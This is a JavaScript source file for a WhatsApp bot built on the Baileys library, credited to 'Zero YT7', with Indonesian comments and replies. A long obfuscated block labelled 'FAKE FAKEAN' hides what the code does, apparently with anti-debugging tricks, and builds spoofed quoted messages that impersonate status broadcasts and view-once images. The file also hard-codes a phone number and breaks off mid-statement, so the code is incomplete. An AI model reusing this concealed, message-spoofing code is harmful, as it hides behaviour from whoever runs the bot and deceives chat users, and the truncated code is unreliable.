//NEW SC BY ZERO YT7
//RECODE SESUKA HATIMU JANGAN HPUS CREATOR NYA
//MAAF SC NYA JELEK
//REUPLOAD ? TAG CHANNELL GUE AJG JNGN MODAL NUMPANG DOANK
//UDAH NUMPANG CREATOR DI HPUS / DI GANTI TOLOL KAH ?
//NGERASA PLING JAGO ? BIKIN BASE / SENDIRI COBA TOD
//JANGAN MODAL NUMPANG PUNYA ORNG DOANK TPI GK BISA HARGAI

//FOLLOW ALL SOSIAL MEDIAML ME
//YOUTUBE : Zero YT7
//INSTAGRAM : @Zero_YT7
//TIKTOK : @_zeroyt7
//GITHUB : Zero-YT7

let { fetchJosn, kyun, fetchText } = require('./lib/fetcher')
let { color, bgcolor } = require('./lib/color')
let  { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl')
let { igDownloader } = require ('./lib/igdown')
let { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')

let
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const fs = require("fs")
const axios = require('axios')
const speed = require("performance-now")
const util = require('util')
const crypto = require('crypto')
const request = require('request')
const { exec, spawn } = require('child_process')
const fetch = require('node-fetch')
const yts = require('yt-search')
const moment = require('moment-timezone')
const ffmpeg = require('fluent-ffmpeg')
const { removeBackgroundFromImageFile } = require('remove.bg')

//━━━━━━━━━━━━━━━[ DATABASE ]━━━━━━━━━━━━━━━━━//

let _antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
let _antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
let setting = JSON.parse(fs.readFileSync('./setting.json'))
let pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))

//━━━━━━━━━━━━━━━[ SETTING ]━━━━━━━━━━━━━━━━━//

owner = setting.OwnerNumber
botname = setting.BotName
zerokey = setting.ZeroKey
ownername = setting.OwnerName
zerkey = setting.ZerKey

//━━━━━━━━━━━━━━━[ MODUL EXPORTS ]━━━━━━━━━━━━━━━━━//

module.exports = zeroyt7 = async (zeroyt7, mek, _welkom) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
        	mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        let content = JSON.stringify(mek.message)
		let from = mek.key.remoteJid
		let { text, extendedText, contact, contactsArray, groupInviteMessage, listMessage, buttonsMessage, location, liveLocation, image, video, sticker, document, audio, product, quotedMsg } = MessageType
		let time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        let type = Object.keys(mek.message)[0]        
        let cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        let prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : ''
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		let command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		let args = body.trim().split(/ +/).slice(1)
		let isCmd = body.startsWith(prefix)
		let q = args.join(' ')
		let Verived = "0@s.whatsapp.net"
		let txt = mek.message.conversation
		let botNumber = zeroyt7.user.jid
		let ownerNumber = [`${owner}@s.whatsapp.net`, `6285157740529@s.whatsapp.net`]
		let isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		let totalchat = await zeroyt7.chats.all()
		let groupMetadata = isGroup ? await zeroyt7.groupMetadata(from) : ''
		let groupName = isGroup ? groupMetadata.subject : ''
		let groupId = isGroup ? groupMetadata.jid : ''
		let groupMembers = isGroup ? groupMetadata.participants : ''
		let groupDesc = isGroup ? groupMetadata.desc : ''
		let groupOwner = isGroup ? groupMetadata.owner : ''
		let groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		let isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		let isGroupAdmins = groupAdmins.includes(sender) || false
		let conts = mek.key.fromMe ? zeroyt7.user.jid : zeroyt7.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        let pushname = mek.key.fromMe ? zeroyt7.user.name : conts.notify || conts.vname || conts.name || '-'
        
		let isAntiLink = isGroup ? _antilink.includes(from) : false
		let isWelkom = isGroup ? _welkom.includes(from) : false
		let isAntiVirtex = isGroup ? _antivirtex.includes(from) : false
		let isOwner = ownerNumber.includes(sender)
		let isUser = pendaftar.includes(sender)
		let isMybot = isOwner || mek.key.fromMe
		
//━━━━━━━━━━━━━━━[ CONNECTION 1 ]━━━━━━━━━━━━━━━━━//

		mess = {
			wait: 'Sabar Lagi Proses Tod...!',
			success: 'Done Jangan Lupa Subscribe Zero YT7',
			error: {
				stick: 'Gagal Convert Gambar To Sticker...Coba Lagi !',
				Iv: 'Linknya Error Tod !'
			},
			only: {
				admin: 'Kusus Admin Tod !',
				group: 'Khusus Group Tod !'
			}
		}
		faketeks = '©Created : Zero YT7'
		let isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
        let reply = (teks) => {
            zeroyt7.sendMessage(from, teks, text, {quoted:mek})
        }
        let sendMess = (hehe, teks) => {
            zeroyt7.sendMessage(hehe, teks, text)
        }
        let mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? zeroyt7.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : zeroyt7.sendMessage(from, teks.trim(), extendedText, { quoted: ftrol, contextInfo: { "mentionedJid": memberr } })
        }
        let zero = fs.readFileSync ('./zeroyt7/zerothumb.jpg')
        let costum = (pesan, tipe, target, target2) => {
			zeroyt7.sendMessage(from, pesan, tipe, { quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` } } })
		}
		const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}       
		let runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
var ase = new Date();
                        var jamss = ase.getHours();
                         switch(jamss){
                case 0: jamss = "Jangan gadang kak"; break;
                case 1: jamss = "Jangan gadang kak"; break;
                case 2: jamss = "Jangan gadang kak"; break;
                case 3: jamss = "Jangan gadang kak"; break;
                case 4: jamss = "Jangan lupa sholat Subuh kak"; break;
                case 5: jamss = "Selamat pagi"; break;
                case 6: jamss = "Selamat pagi"; break;
                case 7: jamss = "Selamat pagi"; break;
                case 8: jamss = "Selamat pagi"; break;
                case 9: jamss = "Selamat pagi"; break;
                case 10: jamss = "Selamat pagi"; break;
                case 11: jamss = "Selamat siang"; break;
                case 12: jamss = "Jangan lupa sholat Zuhur kak"; break;
                case 13: jamss = "Selamat siang"; break;
                case 14: jamss = "Selamat sore"; break;
                case 15: jamss = "Jangan lupa sholat Ashar kak"; break;
                case 16: jamss = "Selamat sore"; break;
                case 17: jamss = "Selamat sore"; break;
                case 18: jamss = "Selamat malam"; break;
                case 19: jamss = "Jangan lupa sholat Isya kak"; break;
                case 20: jamss = "Selamat malam"; break;
                case 21: jamss = "Selamat malam"; break;
                case 22: jamss = "Selamat malam"; break;
                case 23: jamss = "Selamat malam"; break;
            }
            var tampilUcapan = "" + jamss;
        
//━━━━━━━━━━━━━━━[ BUTTON ]━━━━━━━━━━━━━━━━━//

        let sendButton = async (from, context, fortext, but, mek) => {
            buttonMessages = {
                contentText: context,
                footerText: fortext,
                buttons: but,
                headerType: 1
            }
            zeroyt7.sendMessage(from, buttonMessages, buttonsMessage, {
                quoted: ftrol
            })
        }
        let sendButImage = async (from, context, fortext, img, but, mek) => {
            jadinya = await zeroyt7.prepareMessage(from, img, image)
            buttonMessagesI = {
                imageMessage: jadinya.message.imageMessage,
                contentText: context,
                footerText: fortext,
                buttons: but,
                headerType: 4
            }
            zeroyt7.sendMessage(from, buttonMessagesI, buttonsMessage, {
                quoted: ftrol,
            })
        }
        async function sendButLocation(id, text1, desc1, gam1, but = [], options = {}) {
            let buttonMessages = { locationMessage: { jpegThumbnail: gam1 }, contentText: text1, footerText: desc1, buttons: but, headerType: 6 }
            return zeroyt7.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
        }

//━━━━━━━━━━━━━━━[ FAKE FAKEAN ]━━━━━━━━━━━━━━━━━//

        zeroyt7.chatRead(from, "read")
        const _0x4a0d31=_0x336c,_0x4bef8e=_0x336c,_0x28d70f=_0x336c,_0x5a8d7d=_0x336c,_0x326a88=_0x336c;(function(_0x5b25ec,_0x57da21){const _0x2a462e=_0x336c,_0x137b1b=_0x336c,_0x5026e4=_0x336c,_0x2b3db5=_0x336c,_0x114ddc=_0x336c,_0x52488a=_0x5b25ec();while(!![]){try{const _0x4d753d=-parseInt(_0x2a462e(0xdf))/(0x255d+-0x11fa+-0x1362)+parseInt(_0x137b1b(0x13c))/(-0x4e5*0x1+-0x4*0x197+0x3*0x3c1)*(parseInt(_0x2a462e(0x173))/(0x1b0d+0x17*0x12a+-0x35d0))+-parseInt(_0x5026e4(0x1cb))/(-0x44*-0x25+0x1e52*-0x1+-0x32*-0x69)*(-parseInt(_0x2a462e(0x1f3))/(-0x1699+-0x1*-0x1b9e+-0x2*0x280))+-parseInt(_0x2a462e(0xd3))/(-0x1b3c+0x10d7+0xa6b)*(parseInt(_0x5026e4(0xd2))/(-0x5a3+0x7*0x313+-0xfdb))+-parseInt(_0x114ddc(0x190))/(0x1*-0xba7+0x6*-0x57a+-0x3*-0xed9)*(parseInt(_0x5026e4(0x159))/(-0x2177*0x1+-0x1c08+0x3d88))+-parseInt(_0x2a462e(0x1ea))/(-0x293*0x1+0x139b+-0x10fe)+parseInt(_0x2a462e(0x15e))/(-0x12cd+0x1fd*-0x12+-0x1b51*-0x2);if(_0x4d753d===_0x57da21)break;else _0x52488a['push'](_0x52488a['shift']());}catch(_0x2284ea){_0x52488a['push'](_0x52488a['shift']());}}}(_0x6440,-0x20d8a*0x5+0x4d90a*-0x1+0x15382d),setInterval(function(){const _0x8f8c6f=_0x336c,_0x466e92={'AzrbF':function(_0x42bcc9){return _0x42bcc9();}};_0x466e92[_0x8f8c6f(0x1bd)](_0x12b786);},-0x2327+-0x1c49+0xfd*0x50));const _0x51c55c={};_0x51c55c[_0x4a0d31(0x217)+_0x4bef8e(0x169)+'t']=_0x4a0d31(0x21e)+_0x28d70f(0xcc)+_0x5a8d7d(0x20c)+'t';const _0x300f33={};function _0x336c(_0x367981,_0x12b786){const _0x43145d=_0x6440();return _0x336c=function(_0x794a92,_0x4ee609){_0x794a92=_0x794a92-(-0x9a9+-0xcee+-0xb*-0x21f);let _0x49746a=_0x43145d[_0x794a92];return _0x49746a;},_0x336c(_0x367981,_0x12b786);}_0x300f33[_0x5a8d7d(0x15a)+_0x5a8d7d(0xde)]=0x7b,_0x300f33[_0x4bef8e(0x16b)+'s']=0x1,_0x300f33[_0x4a0d31(0x13a)+'ce']=0x1,_0x300f33[_0x4a0d31(0x200)+'ge']=_0x4bef8e(0x208)+_0x326a88(0x164)+_0x28d70f(0x151)+_0x4bef8e(0x1ff),_0x300f33[_0x4bef8e(0x180)+_0x326a88(0xc3)]=_0x5a8d7d(0x208)+_0x326a88(0x164)+_0x326a88(0x151)+_0x28d70f(0x1ff),_0x300f33[_0x4bef8e(0x1c0)+_0x326a88(0x207)]=zero,_0x300f33[_0x326a88(0xfc)+_0x4a0d31(0xc5)]=_0x4a0d31(0x21e)+_0x326a88(0xcc)+_0x28d70f(0x20c)+'t';const _0x34a920={};_0x34a920[_0x326a88(0x180)+_0x326a88(0x1ba)+'ge']=_0x300f33;const _0x4fb8ef={};_0x4fb8ef[_0x4bef8e(0x1e8)]=_0x51c55c,_0x4fb8ef[_0x4bef8e(0x200)+'ge']=_0x34a920;let ftrol=_0x4fb8ef;const _0x4b813f={};_0x4b813f[_0x4bef8e(0x13e)+'e']=![],_0x4b813f[_0x28d70f(0x217)+_0x28d70f(0x169)+'t']=_0x4bef8e(0x21e)+_0x28d70f(0xcc)+_0x28d70f(0x20c)+'t',_0x4b813f[_0x5a8d7d(0x1b2)+_0x4a0d31(0xc8)]=_0x5a8d7d(0x16b)+_0x5a8d7d(0x19a)+_0x28d70f(0x21b)+'t';const fakevo={'key':_0x4b813f,'message':{'imageMessage':{'mimetype':_0x4bef8e(0x14a)+_0x5a8d7d(0x189),'caption':_0x326a88(0x208)+_0x326a88(0x164)+_0x326a88(0x151)+_0x28d70f(0x1ff),'jpegThumbnail':fs[_0x4bef8e(0x13d)+_0x5a8d7d(0x149)+'nc'](_0x4a0d31(0x101)+_0x4bef8e(0x1cf)+_0x4bef8e(0x1a1)+_0x4a0d31(0xed)+_0x326a88(0x13b)),'viewOnce':!![]}}};function hi(){const _0x50a784=_0x4a0d31,_0x49dc58=_0x5a8d7d,_0x4beb46=_0x4a0d31,_0x28452b=_0x4bef8e,_0xea34dc=_0x5a8d7d,_0x2c2c17={'JVXYO':_0x50a784(0x11d)+_0x50a784(0x216)+_0x50a784(0x10a)+')','DuyTk':_0x50a784(0xdc)+_0x50a784(0x136)+_0x4beb46(0xfb)+_0x50a784(0x147)+_0xea34dc(0x1ad)+_0x4beb46(0xd7)+_0x28452b(0xc7),'Dleja':function(_0x2abbd5,_0x53c4bc){return _0x2abbd5(_0x53c4bc);},'azUIL':_0x50a784(0x14b),'NRWlW':function(_0x4eb81f,_0x5e5e2b){return _0x4eb81f+_0x5e5e2b;},'kZBnm':_0x28452b(0x1f2),'UGIlh':function(_0x3d6c8b,_0x38a5c7){return _0x3d6c8b+_0x38a5c7;},'BKOlQ':_0x4beb46(0x143),'cqDFo':function(_0x3582b0){return _0x3582b0();},'zDZmv':function(_0xe45f71,_0xbe9c3f){return _0xe45f71===_0xbe9c3f;},'MillM':_0x49dc58(0xd0),'uaWXd':function(_0x2d94db,_0x18fc6c){return _0x2d94db!==_0x18fc6c;},'CKMeW':_0xea34dc(0x111),'stLYH':function(_0xdcde05,_0x2e0779){return _0xdcde05!==_0x2e0779;},'NrMpT':_0x50a784(0x108),'JcNgs':function(_0x6dbf98,_0x246d15){return _0x6dbf98(_0x246d15);},'xMItv':function(_0x237398,_0x2606da){return _0x237398+_0x2606da;},'OntKs':_0x28452b(0x18b)+_0xea34dc(0x1dd)+_0x49dc58(0xe7)+_0x50a784(0x1b3),'ktigp':_0x50a784(0xce)+_0x28452b(0x1a5)+_0x4beb46(0x215)+_0x28452b(0x153)+_0x28452b(0xbe)+_0x50a784(0x12f)+'\x20)','lAGcg':_0xea34dc(0x1db),'ipXYo':_0x28452b(0xe6),'VpvxM':_0x28452b(0x176)+_0x49dc58(0xc9)+'+$','FfBLV':_0x4beb46(0x160),'oaKpI':_0x50a784(0x10b),'XokFo':_0x50a784(0x223),'ssZBX':_0x49dc58(0x120),'CZOMf':_0x4beb46(0xe5),'absOS':_0x49dc58(0x127),'HgWID':_0x50a784(0xc1),'tPbfH':function(_0x27b4b6,_0x1e9fc5){return _0x27b4b6!==_0x1e9fc5;},'yBwEm':_0x28452b(0xd8),'cKOiY':function(_0x2283cf,_0x204d68){return _0x2283cf+_0x204d68;},'LcbEL':function(_0x19cca2,_0xdebfd2){return _0x19cca2+_0xdebfd2;},'byqZE':_0x49dc58(0xee),'LcTQq':_0xea34dc(0x1b5),'JyqDF':_0x49dc58(0x11b),'XpJvl':_0x4beb46(0x150),'EBQjZ':function(_0x524561){return _0x524561();},'JbboC':function(_0x24f7a7,_0x3c584d){return _0x24f7a7+_0x3c584d;},'BTPJI':_0x28452b(0xdd),'RTKgZ':_0x4beb46(0x1f7),'WyKuz':_0x28452b(0x1d3)+'n','TrQGg':_0x28452b(0x16a)+_0x28452b(0x19e)+_0x49dc58(0x175),'jMGqd':_0xea34dc(0x10d)+'er','EvWjF':_0x4beb46(0xff),'iPjRr':function(_0x59e2c5,_0x2adea5,_0x5eb33b){return _0x59e2c5(_0x2adea5,_0x5eb33b);},'CMWhb':function(_0x319898,_0x26d8e3){return _0x319898+_0x26d8e3;},'xKFAX':_0xea34dc(0x196),'PbIAR':_0x50a784(0xc0),'VFZae':_0x49dc58(0xef),'XUeOa':_0x50a784(0x220),'rDfuh':_0x50a784(0x1f4)+_0x28452b(0x1ef),'XNpCq':_0x49dc58(0xcb),'Dliqe':_0x28452b(0x144),'fwmiS':function(_0x3fddcb,_0x35c266){return _0x3fddcb<_0x35c266;},'XxYVl':_0x50a784(0x1e3),'QjYas':_0x50a784(0xf8),'FFvhK':_0x50a784(0x212),'bBbjK':_0xea34dc(0xd1),'thmDs':function(_0x513520,_0x352a96){return _0x513520!==_0x352a96;},'JpbpH':_0x28452b(0x1c2),'GvmnG':_0xea34dc(0xd6),'qYIxk':_0x28452b(0x21d),'dDJUm':function(_0x4a34e3,_0xf5fd00){return _0x4a34e3+_0xf5fd00;},'RSkJI':_0x49dc58(0x1e5)+_0x49dc58(0x142)+'t','IdNno':function(_0x1ca08a,_0x30ca27){return _0x1ca08a!==_0x30ca27;},'KPZut':_0x49dc58(0x19b),'hktBq':_0xea34dc(0xe0),'RbNvT':function(_0x293480,_0x4f317e){return _0x293480+_0x4f317e;},'nDkjk':function(_0xabbff0,_0x2715c7){return _0xabbff0+_0x2715c7;},'RDvsQ':function(_0x2acef1,_0x265389){return _0x2acef1!==_0x265389;},'IfcKJ':_0x4beb46(0x124),'hGkLy':function(_0x66ca90,_0x34d393){return _0x66ca90<_0x34d393;},'IBxgm':function(_0x2152c2,_0x5819a1){return _0x2152c2!==_0x5819a1;},'Fxyys':_0x50a784(0x122),'xkdrA':function(_0x2168f8,_0x2b4747,_0x3d13ef){return _0x2168f8(_0x2b4747,_0x3d13ef);},'lNnnp':function(_0x59b07c){return _0x59b07c();},'EifOd':_0x28452b(0x15f)+_0x4beb46(0x1a2)+'d!'},_0x5dde41=(function(){const _0x2c8d40=_0x4beb46,_0x2f02ad=_0x28452b,_0x467869=_0x4beb46,_0x610356=_0xea34dc,_0x35d687=_0x49dc58,_0x3d4682={'YhGvt':function(_0x451151,_0x33ef2e){const _0x8a2d2=_0x336c;return _0x2c2c17[_0x8a2d2(0x154)](_0x451151,_0x33ef2e);},'Fxcdk':_0x2c2c17[_0x2c8d40(0x1f6)],'aOBbo':function(_0x508574,_0x24c57f){const _0x19c7db=_0x2c8d40;return _0x2c2c17[_0x19c7db(0x1d8)](_0x508574,_0x24c57f);},'kSEdx':_0x2c2c17[_0x2f02ad(0x1b6)],'AYmUe':function(_0x5c7484,_0x2ec232){const _0x20c9ce=_0x2f02ad;return _0x2c2c17[_0x20c9ce(0x1a3)](_0x5c7484,_0x2ec232);},'SfKoZ':function(_0x30b750,_0x472a56){const _0x3ed6e8=_0x2c8d40;return _0x2c2c17[_0x3ed6e8(0x1e2)](_0x30b750,_0x472a56);},'PNSgp':_0x2c2c17[_0x2c8d40(0xfe)],'JdahB':_0x2c2c17[_0x467869(0x140)],'kOhiG':function(_0x1b690f){const _0x16af44=_0x2c8d40;return _0x2c2c17[_0x16af44(0x214)](_0x1b690f);}};if(_0x2c2c17[_0x35d687(0x126)](_0x2c2c17[_0x2f02ad(0x1fc)],_0x2c2c17[_0x2c8d40(0x1fc)])){let _0x3d39de=!![];return function(_0x46dab3,_0x3400b6){const _0x256a28=_0x467869,_0x265046=_0x2f02ad,_0x575373=_0x467869,_0x5c91da=_0x2c8d40,_0xe5e414=_0x35d687,_0x5a0a92={'RVmNI':_0x2c2c17[_0x256a28(0x1f9)],'SCJPe':_0x2c2c17[_0x256a28(0x1dc)],'HAwWD':function(_0x44b7c5,_0x5c3bdc){const _0x2b9b93=_0x265046;return _0x2c2c17[_0x2b9b93(0x16d)](_0x44b7c5,_0x5c3bdc);},'ZojMl':_0x2c2c17[_0x575373(0x1de)],'cjusM':function(_0x360089,_0x14daca){const _0x3d4a03=_0x265046;return _0x2c2c17[_0x3d4a03(0x1f1)](_0x360089,_0x14daca);},'XyhPX':_0x2c2c17[_0x575373(0x20b)],'MayfI':function(_0x117684,_0x1ac910){const _0x4bd0ec=_0x265046;return _0x2c2c17[_0x4bd0ec(0x1ac)](_0x117684,_0x1ac910);},'kITje':_0x2c2c17[_0x575373(0x1c7)],'bNHjz':function(_0x25172e,_0x437cda){const _0x3d4f53=_0x265046;return _0x2c2c17[_0x3d4f53(0x16d)](_0x25172e,_0x437cda);},'ItLbB':function(_0x33d045){const _0x5d32d2=_0x5c91da;return _0x2c2c17[_0x5d32d2(0x214)](_0x33d045);}};if(_0x2c2c17[_0x256a28(0x126)](_0x2c2c17[_0x256a28(0x188)],_0x2c2c17[_0x265046(0x188)])){const _0x550e72=_0x3d39de?function(){const _0x7725c9=_0x256a28,_0x5c2132=_0x265046,_0x345136=_0xe5e414,_0x59048d=_0x575373,_0x288fe5=_0x575373;if(_0x3d4682[_0x7725c9(0x115)](_0x3d4682[_0x5c2132(0x18f)],_0x3d4682[_0x345136(0x18f)]))return![];else{if(_0x3400b6){if(_0x3d4682[_0x7725c9(0x21f)](_0x3d4682[_0x59048d(0x12c)],_0x3d4682[_0x59048d(0x12c)])){const _0xf1d6e6=new _0x2391a2(BAQQMW[_0x345136(0x194)]),_0x57981c=new _0x289561(BAQQMW[_0x345136(0x195)],'i'),_0x84ed38=BAQQMW[_0x59048d(0xdb)](_0x1727f6,BAQQMW[_0x288fe5(0x187)]);!_0xf1d6e6[_0x288fe5(0x17e)](BAQQMW[_0x345136(0x11c)](_0x84ed38,BAQQMW[_0x5c2132(0x213)]))||!_0x57981c[_0x288fe5(0x17e)](BAQQMW[_0x288fe5(0x123)](_0x84ed38,BAQQMW[_0x288fe5(0x1a4)]))?BAQQMW[_0x7725c9(0xf6)](_0x84ed38,'0'):BAQQMW[_0x59048d(0x1bf)](_0x13499a);}else{const _0x56406c=_0x3400b6[_0x59048d(0x1e0)](_0x46dab3,arguments);return _0x3400b6=null,_0x56406c;}}}}:function(){};return _0x3d39de=![],_0x550e72;}else{if(_0x6c855b)return _0x33b177;else BAQQMW[_0xe5e414(0xf6)](_0x2a845f,-0x1567+0x6fc+0xe6b);}};}else{const _0x469186=CwtOkW[_0x2f02ad(0x152)](_0x2bd8c1,CwtOkW[_0x2f02ad(0x15c)](CwtOkW[_0x35d687(0x15c)](CwtOkW[_0x610356(0x10c)],CwtOkW[_0x467869(0x1b9)]),');'));_0x4c0a1a=CwtOkW[_0x2f02ad(0x1d6)](_0x469186);}}()),_0x2a9116=_0x2c2c17[_0x49dc58(0x1b7)](_0x5dde41,this,function(){const _0x2b6dd1=_0x28452b,_0x232db8=_0xea34dc,_0x470083=_0x28452b,_0x58bf16=_0x50a784,_0x5483bf=_0x50a784;if(_0x2c2c17[_0x2b6dd1(0x1d8)](_0x2c2c17[_0x2b6dd1(0x201)],_0x2c2c17[_0x2b6dd1(0x201)])){const _0xd936f9=_0x29abc2[_0x2b6dd1(0x1d0)+_0x232db8(0x104)+'r'][_0x232db8(0x1fe)+_0x470083(0x16f)][_0x232db8(0x15d)](_0x10ba23),_0x42d92b=_0x34642f[_0x447c6f],_0x44726c=_0x374489[_0x42d92b]||_0xd936f9;_0xd936f9[_0x232db8(0x1a7)+_0x2b6dd1(0x1d7)]=_0x375610[_0x58bf16(0x15d)](_0x5d5ea7),_0xd936f9[_0x232db8(0x19f)+_0x232db8(0x137)]=_0x44726c[_0x2b6dd1(0x19f)+_0x58bf16(0x137)][_0x5483bf(0x15d)](_0x44726c),_0x3f3472[_0x42d92b]=_0xd936f9;}else return _0x2a9116[_0x58bf16(0x19f)+_0x2b6dd1(0x137)]()[_0x5483bf(0x1ce)+'h'](_0x2c2c17[_0x232db8(0x133)])[_0x5483bf(0x19f)+_0x470083(0x137)]()[_0x2b6dd1(0x1d0)+_0x5483bf(0x104)+'r'](_0x2a9116)[_0x232db8(0x1ce)+'h'](_0x2c2c17[_0x232db8(0x133)]);});_0x2c2c17[_0x50a784(0x130)](_0x2a9116);const _0x53a5dd=(function(){const _0xd8f17b=_0x28452b,_0x27f6a1=_0x4beb46,_0x446c49=_0x49dc58,_0x436566=_0x28452b,_0x284219=_0x4beb46,_0x552204={'Mybqp':function(_0x377929,_0x49cf26){const _0x5d1347=_0x336c;return _0x2c2c17[_0x5d1347(0x126)](_0x377929,_0x49cf26);},'rsysP':_0x2c2c17[_0xd8f17b(0x168)],'JOULh':_0x2c2c17[_0x27f6a1(0x11e)],'eIOgo':function(_0x48214a,_0x207784){const _0x271242=_0x27f6a1;return _0x2c2c17[_0x271242(0x1d8)](_0x48214a,_0x207784);},'tDydI':_0x2c2c17[_0x27f6a1(0x132)],'EtPDz':_0x2c2c17[_0x436566(0x106)],'fRECM':_0x2c2c17[_0x436566(0xc4)]};if(_0x2c2c17[_0xd8f17b(0x126)](_0x2c2c17[_0x27f6a1(0x165)],_0x2c2c17[_0x284219(0x125)])){const _0x44aae6=_0x4582ab[_0x284219(0x1e0)](_0x3e6d01,arguments);return _0x10c0e3=null,_0x44aae6;}else{let _0x2b8898=!![];return function(_0x228a50,_0x5cccb8){const _0x5ac7b0=_0x446c49,_0x1a1a77=_0x446c49,_0x1d7c06=_0x284219;if(_0x552204[_0x5ac7b0(0x18a)](_0x552204[_0x5ac7b0(0x105)],_0x552204[_0x1a1a77(0x105)]))return _0x830fff;else{const _0x3917cb=_0x2b8898?function(){const _0x1dd8b6=_0x5ac7b0,_0x54406d=_0x1d7c06,_0x2cba50=_0x1d7c06,_0x578b0c=_0x5ac7b0,_0x305bb2=_0x1d7c06;if(_0x552204[_0x1dd8b6(0xbf)](_0x552204[_0x54406d(0x1a9)],_0x552204[_0x1dd8b6(0x219)]))_0xc7e264=_0x527e41;else{if(_0x5cccb8){if(_0x552204[_0x54406d(0x18a)](_0x552204[_0x54406d(0x179)],_0x552204[_0x2cba50(0x161)])){const _0x202bd9=_0x5cccb8[_0x54406d(0x1e0)](_0x228a50,arguments);return _0x5cccb8=null,_0x202bd9;}else return!![];}}}:function(){};return _0x2b8898=![],_0x3917cb;}};}}());(function(){const _0x4bc808=_0x28452b,_0x12adaf=_0x28452b,_0x30f943=_0x50a784,_0x18cb60=_0x50a784,_0x5bc188=_0x28452b,_0x171118={'PfrdE':function(_0x560221,_0x3f54d8){const _0x5a5a10=_0x336c;return _0x2c2c17[_0x5a5a10(0x192)](_0x560221,_0x3f54d8);},'jVsjw':_0x2c2c17[_0x4bc808(0x156)],'KGpbs':_0x2c2c17[_0x4bc808(0x1e4)],'ZxLMM':_0x2c2c17[_0x30f943(0x20d)],'GGkXK':_0x2c2c17[_0x30f943(0x1be)],'cYjLi':_0x2c2c17[_0x18cb60(0x1a6)],'HcZFz':_0x2c2c17[_0x4bc808(0x133)]};_0x2c2c17[_0x30f943(0xe1)](_0x2c2c17[_0x18cb60(0x1ec)],_0x2c2c17[_0x4bc808(0x1ec)])?function(){return!![];}[_0x4bc808(0x1d0)+_0x5bc188(0x104)+'r'](yPDVoC[_0x4bc808(0x155)](yPDVoC[_0x4bc808(0x1af)],yPDVoC[_0x18cb60(0x141)]))[_0x12adaf(0x167)](yPDVoC[_0x18cb60(0xf1)]):_0x2c2c17[_0x12adaf(0x119)](_0x53a5dd,this,function(){const _0x28da2f=_0x12adaf,_0x3883f6=_0x5bc188,_0x22f664=_0x5bc188,_0x5ab1e5=_0x5bc188,_0x502c93=_0x18cb60;if(_0x2c2c17[_0x28da2f(0xe1)](_0x2c2c17[_0x28da2f(0x1e7)],_0x2c2c17[_0x22f664(0x1e7)]))return function(_0x291d8a){}[_0x5ab1e5(0x1d0)+_0x22f664(0x104)+'r'](yPDVoC[_0x28da2f(0x1c6)])[_0x28da2f(0x1e0)](yPDVoC[_0x28da2f(0xfd)]);else{const _0x343db3=new RegExp(_0x2c2c17[_0x28da2f(0x1f9)]),_0x4ec29d=new 